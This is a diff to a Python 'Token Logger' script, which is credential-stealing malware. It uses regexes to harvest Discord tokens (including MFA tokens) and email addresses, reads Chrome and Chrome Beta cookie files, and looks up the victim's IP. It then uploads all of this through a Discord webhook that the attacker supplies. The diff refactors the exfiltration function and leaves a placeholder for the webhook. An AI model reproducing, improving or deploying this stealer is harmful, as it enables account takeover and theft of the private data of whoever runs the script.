@@ -1,9 +1,4 @@
-"""
-Copied the idea of using a class from D7EAD's script.
-also added more stuff and somewhat wrote this from scratch.
 
-TODO: Make send func look less ugly, made it at 2am
-"""
 import os
 import re
 import discord
@@ -13,7 +8,7 @@ import requests
 
 
 class Logger:
-    def __init__(self, webhook):
+    def __init__(self, webhook): # Ignore this, this is for the class. If you wish to set your webhook look at the very bottom of the script.
         self.MFA_Regex = re.compile(r"mfa\.[\w-]{84}")
         self.Regular_Regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
         self.Email_Regex = re.compile(r"""(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*|"(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*")@(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])""")
@@ -72,31 +67,32 @@ class Logger:
             self.Beta_Cookies_Found = True
             self.Beta_Cookies_File = discord.File(self.Chrome_Beta_User_Data + "/Cookies")
 
-    async def send(self): # I'm aware of how disgusting this function is. 
+    async def send(self):
         webhook = self.webhook
         async with aiohttp.ClientSession() as session:
             w = discord.Webhook.from_url(webhook, adapter=discord.AsyncWebhookAdapter(session))
-            e = discord.Embed(title="Token Logger", description="")
-            e.add_field(name="Discord Tokens", value="\n\n".join(self.Tokens), inline=False)
-            e.add_field(name="IP", value=requests.get("https://api.ipify.org").text)
+
+            # Tokens & IP Embed
+            Token_Embed = discord.Embed(title="Token Logger", description="")
+            Token_Embed.add_field(name="Discord Tokens", value="\n\n".join(self.Tokens), inline=False)
+            Token_Embed.add_field(name="IP", value=requests.get("https://api.ipify.org").text)
+
+            # Beta Cookies Embed
+            Beta_Cookies = discord.Embed(title="Chrome Beta Cookies", description="")
+
+            # Vanilla Cookies Embed
+            Vanilla_Cookies = discord.Embed(title="Chrome Cookies", description="")
+
             if self.Beta_Cookies_Found:
-                wb = discord.Webhook.from_url(webhook, adapter=discord.AsyncWebhookAdapter(session))
-                eb = discord.Embed(title="Chrome Beta Cookies", description="")
-                await wb.send(embed=eb)
-                await wb.send(file=self.Beta_Cookies_File)
+                await w.send(embed=Beta_Cookies, file=self.Beta_Cookies_File)
             elif self.Cookies_Found:
-                wr = discord.Webhook.from_url(webhook, adapter=discord.AsyncWebhookAdapter(session))
-                er = discord.Embed(title="Chrome Cookies", description="")
-                await wr.send(embed=er)
-                await wr.send(file=self.Cookies_File)
+                await w.send(embed=Vanilla_Cookies, file=self.Cookies_File)
             elif self.Emails:
                 file = open("Found_Emails.txt", "w+")
                 file.write("\n".join(self.Emails))
-                #file.close()
-                wr = discord.Webhook.from_url(webhook, adapter=discord.AsyncWebhookAdapter(session))
-                er = discord.Embed(title="Found Emails", description="")
-                await wr.send(embed=er, file=discord.File(file))
+                await w.send(file=discord.File(file))
+                file.close()
 
-            await w.send(embed=e)
+            await w.send(embed=Token_Embed)
 
-Logger("https://discord.com/api/webhooks/blahblahID/blahblah").start()
+Logger("Webhook Here").start()
